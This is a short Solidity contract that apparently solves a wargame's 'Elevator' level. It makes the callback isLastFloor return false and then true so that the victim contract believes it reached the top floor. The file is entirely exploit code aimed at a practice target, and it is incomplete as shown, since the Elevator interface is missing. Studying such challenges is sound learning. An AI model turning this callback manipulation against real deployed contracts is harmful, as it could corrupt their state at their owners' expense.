// Instance Address: 0x95955411421070C83CEFD1fFe8e08AF5676Aa158

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack {
    Elevator public victim;

    constructor(address _victim) public {
        victim = Elevator(_victim);
    }

    uint256 counter;

    function attack() external payable {
    victim.goTo(1);
    }

    function isLastFloor(uint256 /* floor */) external returns (bool) {
    counter++;
    if (counter > 1) return true;
    else return false;
    }
}